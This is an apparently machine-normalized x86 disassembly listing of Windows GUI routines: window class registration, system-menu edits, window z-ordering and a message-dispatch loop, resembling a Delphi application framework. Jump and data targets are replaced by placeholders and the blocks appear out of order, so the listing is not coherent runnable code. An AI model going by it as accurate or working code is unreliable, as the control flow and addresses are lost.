mov [ esp ] sub_46040c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_460604
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_460fa0
xor edx edx
mov eax esi
call sub_46091c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e724
push esi
push sub_45f470
mov eax esi
call sub_4601f8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4058d0
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_40316c
mov eax [ esi + 0x90 ]
call sub_40316c
mov eax [ esi + 0x98 ]
call sub_40316c
test bl bl
jle r-xdata
call sub_41f800
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_45f03c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45f1dd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f1e4
lea eax [ ebp - 0x2c ]
call sub_403f40
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45f5bc
call sub_41f768
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404400
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406d74
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f40
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45fcc0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45fcc0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45f1ec
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45df20
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45f24c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_417d38
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_446450
cmp ebx eax
je r-xdata
sub_45f2bc
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45f24c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_417e94
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45f3d4
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_417e94
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45f470
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cad0
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45e42c
mov eax [ rw-data ]
call sub_45ea74
sub_45f4c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f525
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f52c
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404138
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45f534
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45f570
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45fcc0
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45f5bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_40360c#8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f470
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4606dc
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_417e94
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_446450
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_461608
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4601f8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46019c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_446450
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fcc0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45ea74
push ebp
call sub_45f534
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45f534
pop ecx
jmp [ eax * 4 + jump_table_45f660 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_446450
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_460074
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44adc8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f4c8
push ebp
call sub_45f534
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45f534
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45f534
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41dfa4
jmp r-xdata
xor eax eax
call sub_4572fc
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_446450
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_440d98
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fcdc
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45f534
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45cc74
jmp r-xdata
push ebp
call sub_45f534
pop ecx
jmp r-xdata
push ebp
call sub_45f570
pop ecx
jmp r-xdata
push ebp
call sub_45f534
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f3d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fd8c
jmp r-xdata
jmp r-xdata
call sub_432b54
call sub_432c34
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f3c4
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f3d4
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f3cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4571ac
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45f534
pop ecx
jmp r-xdata
call sub_457260
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45f534
pop ecx
jmp r-xdata
call sub_432b54
call sub_432c90
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d478
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45fcdc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45f3c4
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45ecf4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_446450
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_446450
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45fd8c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45ecf4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_446450
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45f3d4
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_446450
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_45aa00
mov eax [ ebx + 0x44 ]
call sub_45ce1c
sub_45fe8c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45fec8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f94
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404030
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45ff14
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45ff38
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45ff88
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43ca3c
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_446450
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_460040
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_460fa0
sub_460074
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_446450
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403368
test al al
jne r-xdata
sub_4600e0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_460040
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45ff38
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45ff88
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45ff14
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_460178
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4600e0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_460a48
sub_46019c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_417e74
mov eax 0x8
call sub_4026dc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_417d38
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_4601f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_417e94
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
